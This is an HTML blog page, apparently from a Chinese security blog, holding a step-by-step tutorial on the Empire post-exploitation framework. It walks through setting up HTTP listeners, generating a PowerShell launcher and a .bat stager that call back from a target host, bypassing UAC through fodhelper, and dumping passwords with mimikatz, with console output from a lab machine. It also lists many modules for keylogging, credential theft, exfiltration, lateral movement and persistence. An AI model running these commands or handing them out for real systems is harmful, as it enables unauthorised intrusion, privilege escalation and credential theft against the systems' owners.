@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Intranet Space - Empire</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x00-简介">0x00 简介</h2>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485032.jpg" alt="Empire"></p>
+<p>Empire is a PowerShell and Python post-exploitation agent.</p>
+<p><a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p>
+<h2 id="0x01-安装">0x01 安装</h2>
+<pre><code>git clone https://github.com/EmpireProject/Empire
+cd Empire/setup.sh
+./install.sh
+</code></pre><h2 id="0x02-模块介绍">0x02 模块介绍</h2>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119385408.jpg" alt="72c95569361e869b11697561d9a7fcbb.png"></p>
+<h3 id="empire-module-list">Empire Module List</h3>
+<ul>
+<li>agents</li>
+<li>creds</li>
+<li>plugins</li>
+<li>stager</li>
+<li>listeners</li>
+<li>module</li>
+</ul>
+<h3 id="listeners">listeners</h3>
+<p><code>listeners</code>的功能是监听一个端口，通过该端口给客户端传递更多的命令和载荷。</p>
+<h3 id="agents">agents</h3>
+<p><code>agents</code>主要是通过<code>listeners</code>获得的主机对象，可以通过<code>list</code>查看。</p>
+<h3 id="stager">stager</h3>
+<p><code>stager</code>主要是用于生成初级载荷，也就是木马，在客户端执行后，客户端会主动连接<code>listeners</code>监听的端口，同时服务端的<code>agents</code>列表会出现客户端的主机信息。</p>
+<h3 id="module">module</h3>
+<p><code>module</code>的主要功能是通过给<code>agents</code>提供更多的功能，可通过<code>searchmodule</code>搜索。</p>
+<h3 id="plugins">plugins</h3>
+<p><code>plugins</code>主要用于调用和管理Empire的扩展。</p>
+<h3 id="creds">creds</h3>
+<p><code>creds</code>是一个存储一些<code>agents</code>上获取到的凭证。</p>
+<h2 id="0x03-simply-use-empire">0x03 Simply use Empire</h2>
+<h3 id="如何获得agents">如何获得agents</h3>
+<pre><code>./empire # 启动empire
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119428165.jpg" alt="2eca886e0349b46868d2f676b44a9703.png"></p>
+<p>有285个module可以使用，1个listener在使用，0个agents。</p>
+<pre><code>(Empire) &gt; listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  Hello             http            http://192.168.117.181:80            5/0.0                      
+
+(Empire: listeners) &gt; uselistener 
+dbx           http_com      http_hop      meterpreter   redirector    
+http          http_foreign  http_mapi     onedrive     
+</code></pre><p>创建一个<code>listeners</code>：</p>
+<pre><code>(Empire: listeners) &gt; uselistener http
+(Empire: listeners/http) &gt; info
+
+    Name: HTTP[S]
+Category: client_server
+
+Authors:
+  @harmj0y
+
+Description:
+  Starts a http[s] listener (PowerShell or Python) that uses a
+  GET/POST approach.
+
+HTTP[S] Options:
+
+  Name              Required    Value                            Description
+  ----              --------    -------                          -----------
+  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.
+  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
+  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
+  Name              True        Hello                            Name for the listener.
+  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
+  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
+  DefaultLostLimit  True        60                               Number of missed checkins before exiting
+  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
+  SlackChannel      False       #general                         The Slack channel or DM that notifications will be sent to.
+  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
+                                process.php|Mozilla/5.0 (Windows
+                                NT 6.1; WOW64; Trident/7.0;
+                                rv:11.0) like Gecko
+  Host              True        http://192.168.117.181:80        Hostname/IP for staging.
+  CertPath          False                                        Certificate path for https listeners.
+  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
+  Proxy             False       default                          Proxy to use for request (default, none, or other).
+  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
+  StagingKey        True        riOB0K|+*:3a~R2xQb@;U{&amp;Vth&gt;!4/Gd Staging key for initial agent negotiation.
+  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
+  Port              True        8089                             Port for the listener.
+  ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
+  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
+
+</code></pre><p>一般情况只需要指定Host、Port、Name即可，其他的选项可以根据场景设置。</p>
+<pre><code>(Empire: listeners/http) &gt; set Name newListener
+(Empire: listeners/http) &gt; set Port 7788
+(Empire: listeners/http) &gt; execute
+[*] Starting listener 'newListener'
+ * Serving Flask app &quot;http&quot; (lazy loading)
+ * Environment: production
+   WARNING: Do not use the development server in a production environment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+[+] Listener successfully started!
+</code></pre><p>查看<code>listeners</code>：</p>
+<pre><code>(Empire: listeners/http) &gt; listeners
+
+[*] Active listeners:
+
+  Name              Module          Host                                 Delay/Jitter   KillDate
+  ----              ------          ----                                 ------------   --------
+  Hello             http            http://192.168.117.181:80            5/0.0                      
+  newListener       http            http://192.168.117.181:7788            5/0.0                      
+
+</code></pre><p>生成控制命令：</p>
+<pre><code>launcher powershell newListener
+</code></pre><p>在目标主机上执行这条指令后，可以获得一个<code>agent</code>。</p>
+<p><strong>listeners中的Port必须和Host的端口相同</strong></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119441561.jpg" alt="5ce76e0d2cc5751a5185b435fa24dc00.png"></p>
+<pre><code>(Empire: listeners) &gt; agents
+
+[*] Active agents:
+
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------
+ MYZBFLEX ps 192.168.117.179 DESKTOP-7KT7GL1   DESKTOP-7KT7GL1\Rvn0xsy powershell         7256   5/0.0    2018-12-18 02:14:47
+
+(Empire: agents) &gt; 
+</code></pre><h2 id="0x04-使用模块">0x04 使用模块</h2>
+<h3 id="bypass-uac">Bypass UAC</h3>
+<p>常用的有以下模块：</p>
+<ul>
+<li>powershell/privesc/bypassuac</li>
+<li>powershell/privesc/bypassuac_env</li>
+<li>powershell/privesc/bypassuac_eventvwr</li>
+<li>powershell/privesc/bypassuac_fodhelper</li>
+<li>powershell/privesc/bypassuac_sdctlbypass</li>
+<li>powershell/privesc/bypassuac_tokenmanipulation</li>
+<li>powershell/privesc/bypassuac_wscript</li>
+</ul>
+<p>也可以直接这么使用：</p>
+<pre><code>(Empire: agents) &gt; interact MYZBFLEX
+(Empire: MYZBFLEX) &gt; bypassuac
+</code></pre><p>但是默认的bypassuac是使用的<code>bypassuac_eventvwr</code>，这时候就需要调用其他的了
+。</p>
+<pre><code>(Empire: MYZBFLEX) &gt; usemodule privesc/bypassuac_fodhelper 
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; info
+
+              Name: Invoke-FodHelperBypass
+            Module: powershell/privesc/bypassuac_fodhelper
+        NeedsAdmin: False
+         OpsecSafe: False
+          Language: powershell
+MinLanguageVersion: 2
+        Background: True
+   OutputExtension: None
+
+Authors:
+  Petr Medonos
+
+Description:
+  Bypasses UAC by performing an registry modification for
+  FodHelper (based onhttps://winscripting.blog/2017/05/12
+  /first-entry-welcome-and-uac-bypass/)
+
+Comments:
+  https://winscripting.blog/2017/05/12/first-entry-welcome-
+  and-uac-bypass/
+
+Options:
+
+  Name       Required    Value                     Description
+  ----       --------    -------                   -----------
+  Listener   True                                  Listener to use.                        
+  UserAgent  False       default                   User-agent string to use for the staging
+                                                   request (default, none, or other).      
+  Proxy      False       default                   Proxy to use for request (default, none,
+                                                   or other).                              
+  Agent      True        MYZBFLEX                  Agent to run module on.                 
+  ProxyCreds False       default                   Proxy credentials                       
+                                                   ([domain\]username:password) to use for 
+                                                   request (default, none, or other).      
+
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; set Listener hello
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; execute
+[&gt;] Module is not opsec safe, run? [y/N] y
+[*] Tasked MYZBFLEX to run TASK_CMD_JOB
+[*] Agent MYZBFLEX tasked with task ID 2
+[*] Tasked agent MYZBFLEX to run module powershell/privesc/bypassuac_fodhelper
+(Empire: powershell/privesc/bypassuac_fodhelper) &gt; [*] Agent MYZBFLEX returned results.
+Job started: 9HABCE
+[*] Valid results returned by 192.168.117.179
+[*] Sending POWERSHELL stager (stage 1) to 192.168.117.179
+[*] New agent VZWXYL4T checked in
+[+] Initial agent VZWXYL4T from 192.168.117.179 now active (Slack)
+[*] Sending agent (stage 2) to VZWXYL4T at 192.168.117.179
+
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119464496.jpg" alt="20fb5ad72cd8b7ba728b8d0be7d08c87.png"></p>
+<p>此时<code>agents</code>列表如下：</p>
+<pre><code>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
+
+[*] Active agents:
+
+ Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
+ ----     -- -----------     ------------      --------                -------            ---    -----    ---------
+ MYZBFLEX ps 192.168.117.179 DESKTOP-7KT7GL1   DESKTOP-7KT7GL1\Rvn0xsy powershell         7256   5/0.0    2018-12-18 02:22:26
+ VZWXYL4T ps 192.168.117.179 DESKTOP-7KT7GL1   *DESKTOP-7KT7GL1\Rvn0xs powershell         9392   5/0.0    2018-12-18 02:22:26
+
+(Empire: agents) &gt; 
+
+</code></pre><p>计算机名前带有<code>*</code>的<code>agents</code>才可以使用<code>*</code>结尾的模块：</p>
+<pre><code>Display all 204 possibilities? (y or n)
+code_execution/invoke_dllinjection
+code_execution/invoke_metasploitpayload
+code_execution/invoke_ntsd
+code_execution/invoke_reflectivepeinjection
+code_execution/invoke_shellcode
+code_execution/invoke_shellcodemsil
+collection/ChromeDump
+collection/FoxDump
+collection/USBKeylogger*
+collection/WebcamRecorder
+collection/browser_data
+collection/clipboard_monitor
+collection/file_finder
+collection/find_interesting_file
+collection/get_indexed_item
+collection/get_sql_column_sample_data
+collection/get_sql_query
+collection/inveigh
+collection/keylogger
+collection/minidump
+collection/netripper
+collection/ninjacopy*
+collection/packet_capture*
+collection/prompt
+collection/screenshot
+collection/vaults/add_keepass_config_trigger
+collection/vaults/find_keepass_config
+collection/vaults/get_keepass_config_trigger
+collection/vaults/keethief
+collection/vaults/remove_keepass_config_trigger
+credentials/credential_injection*
+credentials/enum_cred_store
+credentials/invoke_kerberoast
+credentials/mimikatz/cache*
+credentials/mimikatz/certs*
+credentials/mimikatz/command*
+credentials/mimikatz/dcsync
+credentials/mimikatz/dcsync_hashdump
+credentials/mimikatz/extract_tickets
+credentials/mimikatz/golden_ticket
+credentials/mimikatz/keys*
+credentials/mimikatz/logonpasswords*
+credentials/mimikatz/lsadump*
+credentials/mimikatz/mimitokens*
+credentials/mimikatz/pth*
+credentials/mimikatz/purge
+credentials/mimikatz/sam*
+credentials/mimikatz/silver_ticket
+credentials/mimikatz/trust_keys*
+credentials/powerdump*
+credentials/sessiongopher
+credentials/tokens
+credentials/vault_credential*
+exfiltration/egresscheck
+exfiltration/exfil_dropbox
+exploitation/exploit_eternalblue
+exploitation/exploit_jboss
+exploitation/exploit_jenkins
+lateral_movement/inveigh_relay
+lateral_movement/invoke_dcom
+lateral_movement/invoke_executemsbuild
+lateral_movement/invoke_psexec
+lateral_movement/invoke_psremoting
+lateral_movement/invoke_smbexec
+lateral_movement/invoke_sqloscmd
+lateral_movement/invoke_sshcommand
+lateral_movement/invoke_wmi
+lateral_movement/invoke_wmi_debugger
+lateral_movement/jenkins_script_console
+lateral_movement/new_gpo_immediate_task
+management/disable_rdp*
+management/downgrade_account
+management/enable_multi_rdp*
+management/enable_rdp*
+management/get_domain_sid
+management/honeyhash*
+management/invoke_script
+management/lock
+management/logoff
+management/mailraider/disable_security
+management/mailraider/get_emailitems
+management/mailraider/get_subfolders
+management/mailraider/mail_search
+management/mailraider/search_gal
+management/mailraider/send_mail
+management/mailraider/view_email
+management/psinject
+management/reflective_inject
+management/restart
+management/runas
+management/shinject
+management/sid_to_user
+management/spawn
+management/spawnas
+management/switch_listener
+management/timestomp
+management/user_to_sid
+management/vnc
+management/wdigest_downgrade*
+management/zipfolder
+persistence/elevated/registry*
+persistence/elevated/schtasks*
+persistence/elevated/wmi*
+persistence/elevated/wmi_updater*
+persistence/misc/add_netuser
+persistence/misc/add_sid_history*
+persistence/misc/debugger*
+persistence/misc/disable_machine_acct_change*
+persistence/misc/get_ssps
+persistence/misc/install_ssp*
+persistence/misc/memssp*
+persistence/misc/skeleton_key*
+persistence/powerbreach/deaduser
+persistence/powerbreach/eventlog*
+persistence/powerbreach/resolver
+persistence/userland/backdoor_lnk
+persistence/userland/registry
+persistence/userland/schtasks
+privesc/ask
+privesc/bypassuac
+privesc/bypassuac_env
+privesc/bypassuac_eventvwr
+privesc/bypassuac_fodhelper
+privesc/bypassuac_sdctlbypass
+privesc/bypassuac_tokenmanipulation
+privesc/bypassuac_wscript
+privesc/getsystem*
+privesc/gpp
+privesc/mcafee_sitelist
+privesc/ms16-032
+privesc/ms16-135
+privesc/powerup/allchecks
+privesc/powerup/find_dllhijack
+privesc/powerup/service_exe_restore
+privesc/powerup/service_exe_stager
+privesc/powerup/service_exe_useradd
+privesc/powerup/service_stager
+privesc/powerup/service_useradd
+privesc/powerup/write_dllhijacker
+privesc/tater
+recon/find_fruit
+recon/get_sql_server_login_default_pw
+recon/http_login
+situational_awareness/host/antivirusproduct
+situational_awareness/host/computerdetails*
+situational_awareness/host/dnsserver
+situational_awareness/host/findtrusteddocuments
+situational_awareness/host/get_pathacl
+situational_awareness/host/get_proxy
+situational_awareness/host/get_uaclevel
+situational_awareness/host/monitortcpconnections
+situational_awareness/host/paranoia*
+situational_awareness/host/winenum
+situational_awareness/network/arpscan
+situational_awareness/network/bloodhound
+situational_awareness/network/get_exploitable_system
+situational_awareness/network/get_spn
+situational_awareness/network/get_sql_instance_domain
+situational_awareness/network/get_sql_server_info
+situational_awareness/network/portscan
+situational_awareness/network/powerview/find_foreign_group
+situational_awareness/network/powerview/find_foreign_user
+situational_awareness/network/powerview/find_gpo_computer_admin
+situational_awareness/network/powerview/find_gpo_location
+situational_awareness/network/powerview/find_localadmin_access
+situational_awareness/network/powerview/find_managed_security_group
+situational_awareness/network/powerview/get_cached_rdpconnection
+situational_awareness/network/powerview/get_computer
+situational_awareness/network/powerview/get_dfs_share
+situational_awareness/network/powerview/get_domain_controller
+situational_awareness/network/powerview/get_domain_policy
+situational_awareness/network/powerview/get_domain_trust
+situational_awareness/network/powerview/get_fileserver
+situational_awareness/network/powerview/get_forest
+situational_awareness/network/powerview/get_forest_domain
+situational_awareness/network/powerview/get_gpo
+situational_awareness/network/powerview/get_group
+situational_awareness/network/powerview/get_group_member
+situational_awareness/network/powerview/get_localgroup
+situational_awareness/network/powerview/get_loggedon
+situational_awareness/network/powerview/get_object_acl
+situational_awareness/network/powerview/get_ou
+situational_awareness/network/powerview/get_rdp_session
+situational_awareness/network/powerview/get_session
+situational_awareness/network/powerview/get_site
+situational_awareness/network/powerview/get_subnet
+situational_awareness/network/powerview/get_user
+situational_awareness/network/powerview/map_domain_trust
+situational_awareness/network/powerview/process_hunter
+situational_awareness/network/powerview/set_ad_object
+situational_awareness/network/powerview/share_finder
+situational_awareness/network/powerview/user_hunter
+situational_awareness/network/reverse_dns
+situational_awareness/network/smbautobrute
+situational_awareness/network/smbscanner
+trollsploit/get_schwifty
+trollsploit/message
+trollsploit/process_killer
+trollsploit/rick_ascii
+trollsploit/rick_astley
+trollsploit/thunderstruck
+trollsploit/voicetroll
+trollsploit/wallpaper
+trollsploit/wlmdr
+</code></pre><h3 id="抓取密码">抓取密码</h3>
+<p>可在agents中直接调用mimikatz：</p>
+<pre><code>(Empire: VZWXYL4T) &gt; mimikatz
+[*] Tasked VZWXYL4T to run TASK_CMD_JOB
+[*] Agent VZWXYL4T tasked with task ID 1
+[*] Tasked agent VZWXYL4T to run module powershell/credentials/mimikatz/logonpasswords
+(Empire: VZWXYL4T) &gt; [*] Agent VZWXYL4T returned results.
+Job started: EV7DPF
+[*] Valid results returned by 192.168.117.179
+
+</code></pre><p>默认是：powershell/credentials/mimikatz/logonpasswords</p>
+<p>也可以使用usemodule指定以下模块：</p>
+<pre><code>credentials/credential_injection*
+credentials/enum_cred_store
+credentials/invoke_kerberoast
+credentials/mimikatz/cache*
+credentials/mimikatz/certs*
+credentials/mimikatz/command*
+credentials/mimikatz/dcsync
+credentials/mimikatz/dcsync_hashdump
+credentials/mimikatz/extract_tickets
+credentials/mimikatz/golden_ticket
+credentials/mimikatz/keys*
+credentials/mimikatz/logonpasswords*
+credentials/mimikatz/lsadump*
+credentials/mimikatz/mimitokens*
+credentials/mimikatz/pth*
+credentials/mimikatz/purge
+credentials/mimikatz/sam*
+credentials/mimikatz/silver_ticket
+credentials/mimikatz/trust_keys*
+credentials/powerdump*
+credentials/sessiongopher
+credentials/tokens
+credentials/vault_credential*
+</code></pre><h3 id="提权">提权</h3>
+<pre><code>usemodule privesc/powerup/allchecks
+execute
+</code></pre><h2 id="0x05-生成stager">0x05 生成stager</h2>
+<pre><code>(Empire) &gt; usestager 
+multi/bash                osx/macho                 windows/launcher_bat
+multi/launcher            osx/macro                 windows/launcher_lnk
+multi/macro               osx/pkg                   windows/launcher_sct
+multi/pyinstaller         osx/safari_launcher       windows/launcher_vbs
+multi/war                 osx/teensy                windows/launcher_xml
+osx/applescript           windows/backdoorLnkMacro  windows/macro
+osx/application           windows/bunny             windows/macroless_msword
+osx/ducky                 windows/csharp_exe        windows/shellcode
+osx/dylib                 windows/dll               windows/teensy
+osx/jar                   windows/ducky             
+osx/launcher              windows/hta             
+</code></pre><p>生成一个bat的：</p>
+<pre><code>usestager windows/launcher_bat
+set Listener hello
+execute
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485031.jpg" alt="f5ddc9cdb32f7eebda8571e0dbb7dbc9.png"></p>
+<p>将bat文件在目标主机上运行即可。</p>
+<p>一般情况下，生成的都是powershell指令，只是引入方式有许多种。</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
